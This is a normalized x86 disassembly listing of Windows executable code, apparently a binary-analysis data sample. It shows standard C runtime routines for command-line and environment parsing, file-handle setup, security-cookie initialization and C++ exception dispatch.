inc esi
sub_415cf4
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_419843
mov al [ esi ]
cmp al bl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_4174d9
mov edi eax
cmp edi ebx
pop ecx
pop ecx
mov [ rw-data ] edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_4108e0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push esi
call sub_4108e0
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_40f613
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push 0x1
push ebp
call sub_4174d9
cmp eax ebx
pop ecx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_40f613
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push ebp
push eax
call sub_410677
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebp
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
sub_415dcf
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
cmp [ ebp + 0x8 ] eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4129b1
test eax eax
pop ecx
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl bl
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
pop esi
pop ebx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edx edx
movsx eax al
push eax
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4129b1
test eax eax
pop ecx
je r-xdata
call sub_4129b1
test eax eax
pop ecx
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_415f67
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] esi
je r-xdata
call sub_419843
mov [ ebp - 0x4 ] esi
cmp [ eax ] bl
mov [ ebp - 0x4 ] eax
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_415dcf
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_417499
mov esi eax
cmp esi ebx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_415dcf
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_416020
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_417499
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_417499
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_415190
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40f613
pop ecx
mov [ esp + 0x10 ] ebx
sub_416155
push 0x54
push r--data
call sub_4106dc
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x28
push 0x20
pop esi
push esi
call sub_4174d9
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x500 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov ecx [ rw-data ]
add ecx 0x500
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
xor esi esi
inc esi
jmp r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
imul esi esi 0x28
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x28
push 0x20
call sub_4174d9
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_410721
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
lea ecx [ esi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x500 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ab5c
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov edx [ ecx ]
add edx 0x500
inc esi
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41ab5c
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_416395
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_4163b9
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_4163dd
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_416471
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ rw-data ] 0x0
push esi
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push [ rw-data ]
call sub_415561
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
push esi
call sub_41bd69
test eax eax
pop ecx
je r-xdata
call sub_4171ac
cmp eax 0x19930521
je r-xdata
push edi
call esi
jmp r-xdata
cmp eax 0x19930522
je r-xdata
pop esi
pop edi
retn 0x4
cmp eax 0x1994000
jne r-xdata
sub_41654f
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_415aa0
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
je r-xdata
sub_4165ab
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_41576b
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
retn
call sub_41576b
add eax 0x90
dec [ eax ]
call sub_41576b
and [ eax + 0x90 ] 0x0
jmp sub_4171ac
sub_4165ef
push 0x10
push r--data
call sub_4106dc
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4166b5
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_41576b
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_410721
retn
call sub_4171f8
call sub_4171f8
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_417240
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4166d0
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_41576b
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_416715
push 0x8
push r--data
call sub_4106dc
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_410721
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_40fe86
mov [ ebp - 0x4 ] 0xfffffffe
sub_416769
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ esp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_41678e
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_4171f8
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
test ebx ebx
lea esi [ eax + 0x4 ]
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_41654f
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_416850
push 0x2c
push r--data
call sub_4106dc
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_41012a
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_41576b
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_41576b
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_41576b
mov [ eax + 0x88 ] esi
call sub_41576b
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_4101bf
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_416976
mov eax [ ebp - 0x1c ]
call sub_410721
retn
sub_4168e9
mov esp [ ebp - 0x18 ]
call sub_41576b
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_4165ef
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_416976
mov eax [ ebp - 0x1c ]
call sub_410721
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_416976
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_410173
pop ecx
call sub_41576b
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_41576b
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_410152
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_416715
pop ecx
pop ecx
sub_4169ec
push 0xc
push r--data
call sub_4106dc
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4171f8
push ebx
push esi
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41bd69
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_418250
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_41bd69
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_416769
pop ecx
pop ecx
push eax
push esi
call sub_418250
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_410721
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_416769
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_416b6b
push 0x8
push r--data
call sub_4106dc
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_416769
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40fe86
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_4169ec
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410721
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_416769
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40fe86
jmp r-xdata
sub_416bfc
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_416b6b
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_40fe56
call sub_40fe8d
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_4165ef
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_416850
add esp 0x28
test eax eax
je r-xdata
sub_416c68
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_41576b
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_41576b
lea edi [ eax + 0x80 ]
call sub_415558
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_4100b7
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_4171f8
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40ff45
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_416bfc
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_416d5a
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_4171f8
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_41576b
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4171f8
jmp sub_4171ac
